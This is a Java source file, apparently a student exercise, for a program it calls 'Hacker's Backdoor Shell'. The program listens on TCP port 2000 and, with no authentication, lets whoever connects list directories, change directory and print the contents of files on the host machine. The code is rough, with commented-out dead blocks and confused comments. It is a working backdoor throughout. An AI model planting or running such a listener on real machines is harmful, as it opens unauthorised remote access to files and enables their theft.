package com.tyner.csudh.backdoor;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;
import java.util.stream.Stream;


public class Backdoor_Shell {
	public static void main(String[] args) throws FileNotFoundException {
		
		//HOW DO I GET FOLDERS INTO THIS ECLIPSE FILE?

		
		try {
			ServerSocket server=new ServerSocket(2000);
			Socket client=server.accept();
			String workingDir=System.getProperty("user.dir");
			String toBeginning = System.getProperty("user.dir");
			String folder = workingDir + File.separator + "folder";
			String prompt=System.getProperty("os.name").toLowerCase().contains("mac os")?" % ":" :> ";
			System.out.println();

			
			InputStream in=client.getInputStream();
			OutputStream out=client.getOutputStream();
			
			BufferedReader reader=new BufferedReader(new InputStreamReader(in));
			BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(out));
		
			writer.write("\n\rWelcome to Hacker's Backdoor Shell\n\n");

			
			File wrkDir = new File(workingDir);
			
			
			
			File toBeg = new File(toBeginning);
			
			String previousDir = null;
			
			File prevDir = null;
			
			while(true) {
				
				
				previousDir = wrkDir.getParent();
			
				prevDir = wrkDir;
				
				writer.write("\n\r"+workingDir+prompt);
				writer.flush();
				String clientCommand=reader.readLine();
			
				String[] cmd=clientCommand.split(" ");
				
			
				
				
				if(clientCommand.equalsIgnoreCase("pwd")) {
					writer.write("\n\rWorking directory is: "+workingDir+"\n\n");
				}
				
				else if(cmd[0].equalsIgnoreCase("dir")){
					
					File [] file = new File(workingDir).listFiles();
					
					String nameFile = new File(workingDir).getName();
					
					writer.write("\n\rList of content for Directory " +nameFile+":\n\r");
					
					
					
					int am = file.length;
					
					for(File f:file)
					{
						
						String isOrNot = null;
						
						long amount = f.length();
						
						if(f.isFile())
						{
							isOrNot = "File";
						}
						else if (f.isDirectory())
						{
							isOrNot = "Directory";
						}
						
						writer.write("\n\r"+ f.getName()+"-"+ isOrNot );
						writer.write("\n\r");
	
						
						//THIS JUST LIST THE NAMES OF THE FILES INSIDE OF THE ECLIPSE
						
					}
					writer.write("\n\rAmount of content in this folder: " + am +"\n");
						
				//	listFiles(workingDir,toBeginning,server,client,reader,writer,wrkDir,toBeg);
					
					
				}
				else if(cmd[0].equalsIgnoreCase("cd")) //PRINTS THE PROMPTS AFTER YOU ALREADY TYPED IT IN
				{
		
				//	String[] Split = clientCommand.split(" ");
					
					File tempWrkDir;

					
							if(cmd[1].equalsIgnoreCase("."))
							{
								wrkDir = wrkDir;
								
								workingDir = workingDir;
								
								//System.out.println("Check 1");
						
							}
							else if (cmd[1].equalsIgnoreCase(".."))//I DON'T KNOW WHAT TO DO HERE
							{
						
								tempWrkDir = new File(workingDir).getParentFile();
								
								
								if(tempWrkDir.getParentFile() == null)
								{
	
									continue;
								}
								workingDir=tempWrkDir.getAbsolutePath();

								
								
							}
							else if(cmd[1].equalsIgnoreCase("~"))
							{
								
								wrkDir = toBeg;
								
								workingDir = toBeginning;
								
	
								
							}
							else
							{
								
								File tempDir=new File(wrkDir+File.separator+cmd[1]);
								if(tempDir.isDirectory()) {
									workingDir=tempDir.getAbsolutePath();
								}
								else {
									writer.write("\n\r");
									writer.write("\rDirectory "+tempDir.getName() + " does not exists\n");
								}
							
								
//								for (String d: Split)
//								{
//									if(!d.contains("cd"))
//									{
//										
//										File directt = new File("C:\\"+d+"\\");
//										
//										wrkDir = directt;
//									
//										
//										if(wrkDir.isDirectory()&&prevDir.isDirectory())
//										{
//											workingDir = d;
//											
//				
//											
//											System.out.println("Check 4");
//							
//												//STILL CONTINUES EVEN THOUGH ITS NOT A DIRECTORY
//												//HAS BEEN FIXED
//										}
//										else if(!wrkDir.isDirectory())
//										{
//											writer.write(d + " does not exists\n");
//										}
//									}
//										
//									}
//	
//								}
					
					//currentDir(workingDir,toBeginning,clientCommand,server,client,reader,writer,wrkDir,toBeg);
					
					
				}
				}
					
					

				else if(clientCommand.contains("cat"))//PRINTS THE PROMPTS AFTER YOU ALREADY TYPED IT IN
				{
					
					
							
					readingFiles(workingDir,cmd,reader,writer);
							
						}
					//}
					
					
					
					
					
					//CLOSES CONNECTION AFTER USING CAT
					
					
			//	}
				else if(clientCommand.equalsIgnoreCase("]"))
				{
					System.exit(0);
				}
				
				
			}
			
			

		}
		catch(IOException e) {
			e.printStackTrace();
		}
		
	
	}

	
	
	public static void readingFiles(String workingDir,String [] cmd,BufferedReader reader,BufferedWriter writer) throws IOException
	{
		
		

		
		for(String spi: cmd)
		{
			
			File fil = new File(workingDir+"\\"+spi);
			
			if(!(spi.contains("cat")))
			{
				
				fil = new File(workingDir+"\\"+spi);
			
				 
				writer.write("\n\r");
				
				if(fil.isFile())
				{
					reader = new BufferedReader(new FileReader(fil));
					
					String data;
					
					while(reader.ready())
					{
					 data = reader.readLine();
					
					
					 
					writer.write(data);
					}
						writer.write("\n\r");
					}
				else if(!fil.isFile())
						{
						//writer.write("\n\r");
						writer.write("File "+spi +" not found!\n"); 
						}
		
			}
		}
	}
}
	
	